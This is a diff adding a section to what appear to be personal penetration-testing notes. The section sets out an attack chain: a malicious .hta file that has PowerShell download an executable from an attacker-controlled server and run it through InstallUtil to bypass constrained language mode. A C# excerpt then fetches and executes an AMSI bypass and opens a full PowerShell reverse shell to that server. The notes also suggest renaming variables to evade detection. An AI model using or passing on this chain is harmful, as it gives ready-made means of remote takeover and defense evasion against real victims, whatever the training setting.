@@ -77,6 +77,34 @@ self.close();
 </html>
 ```
 
+**.hta > CLMBypass > NishangRevShell**
+- Basically craft a hta that directs the victim to download the CLMBypass exe from your apache2 server
+- Within this CLMBypass is an AMSI bypass that is downloaded from your apache2 server and then executing a somewhat obfuscated NishangRevShell (change the var names)
+- The .hta code below
+```html
+<html>
+<head>
+<script language="JScript">
+var shell = new ActiveXObject("WScript.Shell");
+var r = shell.Run("powershell iwr -uri http://192.168.45.193/irs.exe -Outfile C:\\Windows\\tasks\\irs.exe;C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=true /U C:\\Windows\\tasks\\irs.exe");
+</script>
+</head>
+<body>
+<script language="JScript">
+self.close();
+</script>
+</body>
+</html>
+```
+The CLMBypass excerpt below
+```csharp
+String cmd1 = "(New-Object System.Net.WebClient).DownloadString('http://192.168.45.193/amsi.txt') | IEX;";
+            String cmd2 = "$cli = New-Object System.Net.Sockets.TCPClient('192.168.45.193',443);$str = $cli.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $str.Read($bytes, 0, $bytes.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sb = (iex $d 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbyte = ([text.encoding]::ASCII).GetBytes($sb2);$str.Write($sbyte,0,$sbyte.Length);$str.Flush()};$cli.Close()";
+            Runspace rs = RunspaceFactory.CreateRunspace();
+            rs.Open();
+```
+
+
 **C# Shellcode Runner + DOTNET2JS**
 - hmm stealthy? No Powershell at least
 - Spin up the dotnet2js sln file; Remember to comment out the dotnet v2 line in Program.cs of the main project
